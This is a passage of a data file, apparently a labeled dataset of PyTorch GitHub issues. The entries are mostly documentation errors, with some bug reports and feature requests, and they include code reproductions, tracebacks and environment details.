1.1.1            py37h47e9c7a_0  \r\n[conda] numpy                     1.19.1           py37h5510c5b_0  \r\n[conda] numpy-base                1.19.1           py37ha3acd2a_0  \r\n[conda] pytorch                   1.6.0               py3.7_cpu_0  [cpuonly]  pytorch\r\n[conda] torchvision               0.7.0                  py37_cpu  [cpuonly]  pytorch\r\n\r\nProcess finished with exit code 0\r\n```\r\n\r\n## Additional context\r\n Also happens on 1.5.0\r\n\n\ncc @ezyang @gchanan @zou3519 @SsnL @VitalyFedyunin @jlin27"},{"labels":[null,null,"documentation",null],"text":"## ❓ Questions and Help\r\n\r\nMy work host have all instruction sets, but service hosts are not support service host, such as 'AVX' and 'SSE4', so i want to disable the instruction set before build libtorch. How can I do it?\n\ncc @malfet @seemethere @walterddr @yf225 @glaringlee @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nAt https://pytorch.org/docs/stable/optim.html, we see that the function `torch.optim.lr_scheduler.MultiStepLR` has a parameter called `verbose` that `If True, prints a message to stdout for each update. Default: False`.\r\n\r\nUsing `torch.__version__==1.6.0`, \r\nthis minimum example returns an error:\r\n\r\n```\r\nimport torch.nn as nn\r\nfrom torch.optim import Adam\r\nfrom torch.optim.lr_scheduler import MultiStepLR\r\n\r\nN, D_in, H, D_out = 64, 1000, 100, 10\r\n\r\nmodel = nn.Sequential(\r\n    nn.Linear(D_in, H),\r\n    nn.ReLU(),\r\n    nn.Linear(H, D_out),\r\n)\r\n\r\noptimizer = Adam(model.parameters(), lr=1e-04)\r\nscheduler = MultiStepLR(optimizer, milestones=[20,30], gamma=0.5, verbose=True)\r\n```\r\n\r\nError:\r\n```\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: __init__() got an unexpected keyword argument 'verbose'\r\n```\r\n\r\nFrom the [source code](https://pytorch.org/docs/stable/_modules/torch/optim/lr_scheduler.html#MultiStepLR) (linked in the documentation), this looks generalized to the other learning rate schedulers as well.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. follow the  mnist tutorial (https://pytorch-lightning.readthedocs.io/en/stable/new-project.html)\r\n1. use Trainer(tpu_cores=1)\r\n1. run\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n```\r\nTraceback (most recent call last):\r\n  File \"plmnist.py\", line 80, in <module>\r\n    trainer.fit(model, train_loader, val_loader)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/states.py\", line 48, in wrapped_fn\r\n    result = fn(self, *args, **kwargs)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/trainer.py\",line 1078, in fit\r\n    self.accelerator_backend.train(model)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/accelerators/tpu_backend.py\", line 87, in train\r\n    start_method=self.start_method\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch_xla/distributed/xla_multiprocessing.py\", line 284, in spawn\r\n    return _run_direct(fn, args, nprocs, join, daemon, start_method)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch_xla/distributed/xla_multiprocessing.py\", line 245, in _run_direct\r\n    fn(0, *args)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/accelerators/tpu_backend.py\", line 112, in tpu_train_in_process\r\n    results = trainer.run_pretrain_routine(model)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/trainer.py\",line 1239, in run_pretrain_routine\r\n    self.train()\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 394, in train\r\n    self.run_training_epoch()\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 491, in run_training_epoch\r\n    batch_output = self.run_training_batch(batch, batch_idx)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 844, in run_training_batch\r\n    self.hiddens\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/trainer/training_loop.py\", line 1049, in optimizer_closure\r\n    training_step_output_for_epoch_end = copy(training_step_output)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/copy.py\", line 88, in copy\r\n    return copier(x)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/pytorch_lightning/core/step_result.py\", line 302, in __copy__\r\n    newone[k] = copy(v)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/copy.py\", line 96, in copy\r\n    rv = reductor(4)\r\n  File \"/***/anaconda3/envs/turing/lib/python3.7/site-packages/torch/tensor.py\", line 87, in __reduce_ex__\r\n    args = (self.cpu().numpy(),\r\nRuntimeError: Can't call numpy() on Tensor that requires grad. Use tensor.detach().numpy() instead.\r\n```\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nEnvironment\r\nCUDA:\r\n- GPU:\r\n- available: False\r\n- version: None\r\nPackages:\r\n- numpy: 1.19.0\r\n- pyTorch_debug: False\r\n- pyTorch_version: 1.6.0.dev20200622\r\n- pytorch-lightning: 0.9.0\r\n- tensorboard: 2.2.0\r\n- tqdm: 4.48.2\r\nSystem:\r\n- OS: Linux\r\n- architecture:\r\n- 64bit\r\n-\r\n- processor:\r\n- python: 3.7.7\r\n- version: #1 SMP Debian 4.14.81.bm.15 Sun Sep 8 05:02:31 UTC 2019\r\n\r\nPyTorch Version (e.g., 1.0): 1.6\r\nOS (e.g., Linux): Linux\r\nHow you installed PyTorch (conda, pip, source): pip\r\nBuild command you used (if compiling from source):\r\nPython version: 3.7.8\r\nCUDA/cuDNN version: None\r\nGPU models and configuration: None\r\nAny other relevant information: torch_xla:1.6.0\r\n\r\n## Additional context\r\n\r\n```\r\n/pytorch_lightning/trainer/training_loop.py(1049)optimizer_closure()\r\n\r\n1044\r\n1045                # if the user decides to finally reduce things in epoch_end, save raw output without graphs\r\n1046                if isinstance(training_step_output_for_epoch_end, torch.Tensor):\r\n1047                    training_step_output_for_epoch_end = training_step_output_for_epoch_end.detach()\r\n1048                elif is_result_obj:\r\n1049B->              training_step_output_for_epoch_end = copy(training_step_output) ###<- there should be detach before copy\r\n1050                    training_step_output_for_epoch_end.detach()\r\n1051                else:\r\n1052                    training_step_output_for_epoch_end = recursive_detach(training_step_output_for_epoch_end)\r\n1053\r\n```\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\nI was reading [this](https://github.com/pytorch/pytorch/wiki/Autograd-and-Fork) wiki page to solve multiprocess issue and I noticed that `Autograd engine relays on threads pool, `, which is the first sentence, probably has a spelling error. \r\n\r\nI think it's supposed to be 'relies' rather than 'relays' because the latter is something to do with sending signals or such and the former means it depends upon something like the threads pool. Plus, I think there could be a link to python documentation to point out that this type of context is actually problematic: https://docs.python.org/3/library/multiprocessing.html#contexts-and-start-methods\r\n\r\nAlso, I think it will be useful to have an explicit import of `multiprocessing` like this:\r\n```python\r\nimport multiprocessing as mp\r\n\r\n# The rest of code samples.\r\n```\r\n\r\nThanks\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\nHi\r\n\r\n`torch.finfo.tiny` has the description \r\n> \"The smallest positive representable number\". \r\n\r\nIt's ambiguous, and not the actual smallest positive number. For example, `torch.finfo(\"torch.float16\").tiny` get **6.10e-5**, but the smallest positive representable number in FP16 should be **2^-24** or **5.96e-8**. `numpy.finfo.tiny` also has this problem.\r\n\r\nI check the code in [`TypeInfo.cpp`](https://github.com/pytorch/pytorch/blob/0651887eb4fd85ebbf65ab29ff2b634226871fee/torch/csrc/TypeInfo.cpp#L169), it uses `std::numeric_limits<>::min()` to get this value, but it should be `std::numeric_limits<>::denorm_min()` according the [document](http://www.cplusplus.com/reference/limits/numeric_limits/).\r\n\r\nI am not sure whether the `tiny` function should be modified or add new function, such as `denorm_tiny`, or just fix the description to be\r\n> \"The minimum normalized positive number\".\r\n\r\nThanks\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/91463487-70c65180-e859-11ea-90d6-3a83df442108.png)\r\n\r\nWe can change this to \"tensors that require grad\"\n\ncc @jlin27"},{"labels":["documentation",null],"text":"I find this when working on https://github.com/pytorch/pytorch/issues/43667\r\n\r\nIf you replace the docs of `torch.bmm`\r\n```\r\nArgs:\r\n    input (Tensor): the first batch of matrices to be multiplied\r\n    mat2 (Tensor): the second batch of matrices to be multiplied\r\n    deterministic (bool, optional): flag to choose between a faster non-deterministic\r\n                                    calculation, or a slower deterministic calculation.\r\n                                    This argument is only available for sparse-dense CUDA bmm.\r\n                                    Default: ``False``\r\n    {out}\r\n```\r\nwith\r\n```\r\nArgs:\r\n    input (Tensor): the first batch of matrices to be multiplied\r\n    mat2 (Tensor): the second batch of matrices to be multiplied\r\n\r\nKeyword args:\r\n    deterministic (bool, optional): flag to choose between a faster non-deterministic\r\n                                    calculation, or a slower deterministic calculation.\r\n                                    This argument is only available for sparse-dense CUDA bmm.\r\n                                    Default: ``False``\r\n    {out}\r\n```\r\nyou will get an error\r\n```\r\ndocstring of torch.bmm:: WARNING: more than one target found for cross-reference 'bool': torch.FloatStorage.bool, torch.Tensor.bool\r\n```\r\n\r\ncc @jlin27 @mruberry "},{"labels":["documentation",null],"text":"Keyword arguments should be put into a separate section `Keyword Arguments` instead of inside `Parameters`, just like:\r\n![image](https://user-images.githubusercontent.com/1032377/91362885-3c4a8b00-e7b0-11ea-87fa-84f11111760c.png)\r\ninstead of\r\n![image](https://user-images.githubusercontent.com/1032377/91362983-7025b080-e7b0-11ea-8446-bc7123109b23.png)\r\n\r\nI have three PRs fixing this issue: https://github.com/pytorch/pytorch/pull/43583 https://github.com/pytorch/pytorch/pull/43586 https://github.com/pytorch/pytorch/pull/43589\r\n\r\nBut some of them can not be fixed due to https://github.com/pytorch/pytorch/issues/43669: List of ops remaining to be fixed:\r\n- `torch.eye`\r\n- `torch.bmm`\r\n- `torch.gather`\r\n- `torch.linspace`\r\n- `torch.logspace`\r\n- `torch.ones`\r\n- `torch.ones_like`\r\n- The entire https://github.com/pytorch/pytorch/pull/43589\r\n\r\n\r\ncc @jlin27 @mruberry "},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.empty.html#torch.empty\r\n\r\n#### API\r\n\r\n`torch.empty`\r\n\r\n#### Issue\r\n\r\nThe signature in document of API `torch.empty` is incomplete. It didn't include `memory_format`, which is actually accepted by the function.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91071928-c35bff80-e606-11ea-8015-ff333c30633a.png)\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/quantization.html#torch.quantization.quantize_dynamic\r\n\r\n#### API\r\n\r\n`torch.quantization.quantize_dynamic`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `module` , but it is not in the signature, and it is not accepted by the function.\r\n\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91071527-4cbf0200-e606-11ea-8903-51d6d25365a4.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/distributed.html#torch.distributed.all_reduce_multigpu\r\n\r\n#### API\r\n\r\n`torch.distributed.all_reduce_multigpu`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `list`, but it is not in the signature, and it is not accepted by the function. It should be `tensor_list`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91068305-1b443780-e602-11ea-8e9f-c065e3ac5092.png)\r\n\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\ntorch.distributed.all_reduce_multigpu(list=[])\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: all_reduce_multigpu() got an unexpected keyword argument 'list'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.6.0\r\n- Python version: 3.8.2\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/nn.functional.html#torch.nn.functional.embedding_bag\r\n\r\n#### API\r\n\r\n`torch.nn.functional.embedding_bag`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input :\r\n\r\n**last element is the size of the input, or the ending index position of the last bag** (*The*) –\r\n\r\nwhich should be part of the description for input argument `include_last_offset`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067883-788bb900-e601-11ea-9342-e699c095979d.png)\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.lu_solve.html#torch.lu_solve\r\n\r\n#### API\r\n\r\n`torch.lu_solve`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input `b` , but it is not in the signature.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067635-2fd40000-e601-11ea-844c-651148a46bd6.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.clamp.html#torch.clamp\r\n\r\n#### API\r\n\r\n`torch.clamp`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section under the following two signature:\r\n\r\n- `torch.clamp(input, *, min, out=None) → Tensor`\r\n- `torch.clamp(input, *, max, out=None) → Tensor`\r\n\r\nthere is an input argument `value` , but it is not in the signature, and it is not accepted by the function. It should be `min ` and `max` respectively\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067305-bdfbb680-e600-11ea-8124-9ca4613ae37c.png)\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91067329-c5bb5b00-e600-11ea-98ab-5cbb6af8d4a2.png)\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\na = torch.randn(4)\r\ntorch.clamp(a, max=0.5, value =1)\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: clamp() got an unexpected keyword argument 'value'\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.poisson.html#torch.poisson\r\n\r\n#### API\r\n\r\n`torch.poisson`\r\n\r\n#### Issue\r\n\r\nThere is an format issue in the function's signature. The input `input * ` should be `input`.\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91066984-59d8f280-e600-11ea-87a4-8955a0144dd4.png)\r\n\r\n\r\nCode example:\r\n\r\n~~~python\r\nimport torch\r\nrates = torch.rand(4, 4) * 5 \r\ntorch.poisson(input=rates)\r\n~~~\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version: 1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n#### Link\r\n\r\nhttps://pytorch.org/docs/stable/generated/torch.take.html#torch.take\r\n\r\n#### API\r\n\r\n`torch.take`\r\n\r\n#### Issue\r\n\r\nIn the \"Parameters\" section, there is an input ` indices`, but it is not in the signature, and it is not accepted by the function. It should be `index`\r\n\r\n![image](https://user-images.githubusercontent.com/24580222/91066752-154d5700-e600-11ea-9371-a77f1a9ed16b.png)\r\n\r\n\r\nRunning code :\r\n\r\n~~~python\r\nimport torch\r\nsrc = torch.tensor([[4, 3, 5], [6, 7, 8]])\r\ntorch.take(src, indices=torch.tensor([0, 2, 5]))\r\n~~~\r\n\r\ngives exception \r\n\r\n~~~python\r\nTypeError: take() missing 1 required positional arguments: \"index\"\r\n~~~\r\n\r\n\r\n\r\nBut it throws no exception when running:\r\n\r\n~~~python\r\ntorch.take(src, index=torch.tensor([0, 2, 5]))\r\n~~~\r\n\r\n\r\n\r\n#### **System information**\r\n\r\n- OS: MacOS Mojave 10.14\r\n- PyTorch version:  1.7.0.dev20200819+cpu\r\n- Python version: 3.8.2\n\ncc @jlin27"},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nAs reported at https://github.com/pytorch/pytorch/issues/32994, since pytorch-1.5 `nonzero` started to require an explicit `as_tuple` argument. The current docs don't reflect that. https://pytorch.org/docs/master/generated/torch.nonzero.html\r\n\r\n```\r\nimport torch\r\nprint(torch.__version__)\r\ntorch.nonzero(torch.tensor([1, 1, 1, 0, 1])) # current example\r\ntorch.nonzero(torch.tensor([1, 1, 1, 0, 1]), as_tuple=False) # should be instead\r\n```\r\noutput:\r\n```\r\n1.7.0.dev20200813\r\ntest2:4: UserWarning: This overload of nonzero is deprecated:\r\n        nonzero(Tensor input, *, Tensor out)\r\nConsider using one of the following signatures instead:\r\n        nonzero(Tensor input, *, bool as_tuple) (Triggered internally at  /opt/conda/conda-bld/pytorch_1597302504919/work/torch/csrc/utils/python_arg_parser.cpp:864.)\r\n  torch.nonzero(t)\r\n```\r\n\r\nShould the examples be modified to explicitly pass the `as_tuple` argument to match the code requirements? \r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"As mentioned [here](https://github.com/pytorch/pytorch/pull/31125#issuecomment-673654283), the warning in LambdaLR should be removed and replaced by a simple note in the load/save state_dict documentation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nIt is not clear what I can pass as args in `torch.multiprocessing.spawn()`\r\nCan I pass the model, dataset, optimizer, scheduler, etc. through the args? Is it just primitives or perhaps objects which can be pickled?\r\n\r\nIt would be great if a more concrete explanation was available.\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nWith latest nightly I can't pass a CUDA tensor for the `lengths` argument to `nn.utils.rnn.pack_padded_sequence`.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\nfrom torch.nn.utils.rnn import pack_padded_sequence\r\nseq = torch.tensor([[1,2,0], [3,0,0], [4,5,6]], device='cuda')\r\nlens = torch.tensor([2, 1, 3], device='cuda')\r\npack_padded_sequence(seq, lens, enforce_sorted=False)\r\n# RuntimeError: 'lengths' argument should be a 1D CPU int64 tensor, but got 1D cuda:0 Long tensor\r\n```\r\n\r\n## Expected behavior\r\n\r\nThis works on torch 1.5:\r\n```python\r\nseq = torch.tensor([[1,2,0], [3,0,0], [4,5,6]], device='cuda')\r\nlens = torch.tensor([2, 1, 3], device='cuda')\r\npack_padded_sequence(seq, lens, enforce_sorted=False)\r\n# PackedSequence(data=tensor([0, 1, 2, 0, 3, 6], device='cuda:0'), batch_sizes=tensor([3, 2, 1]), sorted_indices=tensor([2, 0, 1], device='cuda:0'), unsorted_indices=tensor([1, 2, 0], device='cuda:0'))\r\n```\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.7.0.dev20200817+cu101\r\n - OS (e.g., Linux): Ubuntu\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.6.10\r\n - CUDA/cuDNN version: CUDA 10.1, cuDNN 7.6.5.32\r\n - GPU models and configuration: 8 x V100\r\n - Any other relevant information:\n\ncc @ngimel @jlin27 @zou3519"},{"labels":[null,"documentation",null],"text":"## 🚀 Feature\r\nWe need an option to temporarily close DDP `all_reduce`.\r\n\r\n## Motivation\r\nThe training speed can be accelerated when combining DDP and gradient accumulation.   \r\nWhen applying gradient accumulation, the `optimizer.step()` is called every K steps intead of every step. And as we know every training step (with `loss.backward()`) DDP would activate an `all_reduce`. Therefore, there are K-1 steps of `all_reduce` wasted! Considering the time cost of `all_reduce` especially for multi-node  training, the training speed can be accelerated a lot if we supply an option to call DDP `all_reduce` every K step.\r\n\r\n\r\n## Pitch\r\n\r\n```\r\nmodel = DDP(model)\r\nfor data, label in dataloder:\r\n  optimizer.zero_grad()\r\n  # which I want.\r\n  model.stop_gradient_reduce()\r\n  for i in range(K):\r\n    prediction = model(data)    \r\n    if i == K-1:\r\n        model.start_gradient_reduce()\r\n    loss_fn(prediction, label).backward()\r\n  optimizer.step()\r\n```\r\n\r\n\r\n## Possible Implementation\r\nI notice `reducer` has a method `prepare_for_backward()`.\r\n```\r\nself.reducer.prepare_for_backward(all_parameters)\r\n```\r\nIt seems like if all parameter are set ready here, we can safely jump the `all_reduce`. Or did we need to dig deeper?\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn [`EmbeddingBag`](https://pytorch.org/docs/stable/generated/torch.nn.Embedding.html#torch.nn.Embedding), it is stated: \r\n\r\nwith `mode=\"mean\"` is equivalent to `Embedding` followed by `torch.mean(dim=0)`\r\n\r\nHowever, I think the author intends `dim=1` instead. This is seen by comparing the following example ... \r\n```\r\n>>> # an Embedding module containing 10 tensors of size 3\r\n>>> embedding_sum = nn.EmbeddingBag(10, 3, mode='sum')\r\n>>> # a batch of 2 samples of 4 indices each\r\n>>> input = torch.LongTensor([1,2,4,5,4,3,2,9])\r\n>>> offsets = torch.LongTensor([0,4])\r\n>>> embedding_sum(input, offsets)\r\ntensor([[-0.8861, -5.4350, -0.0523],\r\n        [ 1.1306, -2.5798, -1.0044]])\r\n```\r\n... with the corresponding example in [`Embedding`](https://pytorch.org/docs/stable/generated/torch.mean.html).\r\n\r\n```\r\n>>> # an Embedding module containing 10 tensors of size 3\r\n>>> embedding = nn.Embedding(10, 3)\r\n>>> # a batch of 2 samples of 4 indices each\r\n>>> input = torch.LongTensor([[1,2,4,5],[4,3,2,9]])\r\n>>> embedding(input)\r\ntensor([[[-0.0251, -1.6902,  0.7172],\r\n         [-0.6431,  0.0748,  0.6969],\r\n         [ 1.4970,  1.3448, -0.9685],\r\n         [-0.3677, -2.7265, -0.1685]],\r\n\r\n        [[ 1.4970,  1.3448, -0.9685],\r\n         [ 0.4362, -0.4004,  0.9400],\r\n         [-0.6431,  0.0748,  0.6969],\r\n         [ 0.9124, -2.3616,  1.1151]]])\r\n```\n\ncc @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=get_last_lr&check_keywords=yes&area=default#\r\n![image](https://user-images.githubusercontent.com/1041752/90317248-3f2fbb00-df28-11ea-8d29-0ee16e078b3f.png)\r\n\r\n\r\nshows nothing. despite get_last_lr being recommended by PyTorch warnings for getting the last computed lr\r\n\r\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## ❓ Questions and Help\r\n\r\nHi. I've been trying to take advantage of new mixed-precision set of tools, mainly following the instructions given in https://pytorch.org/docs/stable/amp.html#autocasting. My code is running, I see that the gradients are being scaled as expected, however, my memory footprint is de facto the same (inspected by nvidia-smi), and the overall execution time is even longer. I was wondering how I can debug this and what could possibly go wrong.\r\n\r\nThe changes to my code are minimal: (1) I added autocast context to the body of my forward method; and (2) gradient scaling updates as suggested in the tutorial. The operations in my code are standard, lots of CNN and torch.mm executions. My program is being executed on 8 GPUs, for data parallelism.\r\n\r\n## Environment\r\n\r\n - PyTorch Version: 1.6.0\r\n - OS: Linux\r\n - How you installed PyTorch: pip\r\n - Python version: 3.7\r\n - CUDA/cuDNN version: 10.1\r\n - GPU models and configuration: 8 x Tesla V100\r\n\n\ncc @mcarilli @jlin27"},{"labels":[null,"documentation",null],"text":"I want to install pytorch1.5.1 torchvision0.6.1 in centos7 cuda10.2 python3.7. \r\n1.I clicked \"Previous Versions of PyTorch\" on the Pytroch site. \r\n2.I choice ‘v1.5.0’，‘wheel’，‘Linux and Windows’，‘# CUDA 10.2 pip install torch==1.5.0 torchvision==0.6.0 -f https://download.pytorch.org/whl/torch_stable.html’.\r\n`(py37) [himap@localhost py37]$ pip install torch==1.5.1 -f https://download.pytorch.org/whl/torch_stable.html\r\nLooking in links: https://download.pytorch.org/whl/torch_stable.html\r\nRequirement already satisfied: torch==1.5.1 in ./lib/python3.7/site-packages (1.5.1+cu92)\r\nRequirement already satisfied: future in ./lib/python3.7/site-packages (from torch==1.5.1) (0.18.2)\r\nRequirement already satisfied: numpy in ./lib/python3.7/site-packages (from torch==1.5.1) (1.18.1)`\r\nAfter using this command, I get Pytroch1.5.1 + cu92\r\n`>>> torch.__version__\r\n'1.5.1+cu92'\r\n`\r\n3.When I use \"pip install torch==1.5.1+cu102 -f https://download.pytorch.org/whl/torch_stable.html\", he prompts me\" `Looking in links: https://download.pytorch.org/whl/torch_stable.html\r\nERROR: Could not find a version that satisfies the requirement torch==1.5.1+cu102 (from versions: 0.1.2, 0.1.2.post1, 0.1.2.post2, 0.4.1, 0.4.1.post2, 1.0.0, 1.0.1, 1.0.1.post2, 1.1.0, 1.2.0, 1.2.0+cpu, 1.2.0+cu92, 1.3.0, 1.3.0+cpu, 1.3.0+cu92, 1.3.1, 1.3.1+cpu, 1.3.1+cu92, 1.4.0, 1.4.0+cpu, 1.4.0+cu92, 1.5.0, 1.5.0+cpu, 1.5.0+cu101, 1.5.0+cu92, 1.5.1, 1.5.1+cpu, 1.5.1+cu101, 1.5.1+cu92, 1.6.0, 1.6.0+cpu, 1.6.0+cu101, 1.6.0+cu92)\r\nERROR: No matching distribution found for torch==1.5.1+cu102\"`\r\nSo I think there is a problem with the official order.\n\ncc @ezyang @seemethere @malfet @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThis issue refers to #42864, but the original issue was closed by the author while I was writing my response to it.\r\n\r\nThese are the docs at the moment:\r\n![loss1](https://user-images.githubusercontent.com/47462742/89954344-2f1a9180-dc31-11ea-9dc1-5e73ee5f1d88.PNG)\r\n\r\nBased on the [source](https://github.com/pytorch/pytorch/blob/0ff0fea42bf9721b87e01fe15445dfd3ea5f2093/aten/src/ATen/native/Loss.cpp#L74) the correct input/target shape is:\r\n- Input 1: (N, ∗) where ∗ means, any number of additional dimensions\r\n- Input 2: (N, ∗) same shape as Input 1, or it has to be broadcastable to that shape\r\n- Target: (N, ∗), same shape as Input 1 or Input 2, or it has to be broadcastable to that shape\r\n\r\nSo I think  this part in the docs should be fixed and an example of how to use the loss would be helpful.\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nOn master documentation: the quotes around \"mean\" and \"sum\" look a little weird but it isn't a big deal\r\n\r\n![image](https://user-images.githubusercontent.com/5652049/89908595-0efcbb00-dbbc-11ea-9a9a-642105579849.png)\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe documentation of Adam since v1.6.0 suggests that it uses the weight decay fix proposed by paper \"Decoupled Weight Decay Regularization\":\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adam.py#L10-L11\r\n\r\nHowever I found this to not be the case. The actual weight decay in Adam is still the old one:\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adam.py#L99-L100\r\n\r\nIn contrast, the new weight decay fix is implemented in AdamW, and explained by the AdamW doc:\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adamw.py#L10\r\n\r\nhttps://github.com/pytorch/pytorch/blob/4b4273a04e566dcdf4cb96882f49c41127e8d3f1/torch/optim/adamw.py#L73\r\n\r\nIt is possible that I misunderstood the current documentation of Adam, but I found it confusing and suggest that currently there is no difference between the Adam and AdamW implementations, while the difference still exists.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIn the [docs](https://pytorch.org/docs/stable/generated/torch.nn.RNN.html) (the same applies to LSTM and GRU) in case of the reccurent **bidirectional** layer, it is not mentioned that there is an additional set of parameters suffixed with `_reverse` that are used in the backward pass:\r\n(k represents the layer)\r\n* `weight_hh_l[k]_reverse` \r\n* `weight_ih_l[k]_reverse` \r\n* `bias_hh_l[k]_reverse`\r\n* `bias_ih_l[k]_reverse`\r\n\r\nIn my opinion, it makes sense to have them documented so the user can easily access them and e.g. apply his own initialization procedure.\n\ncc 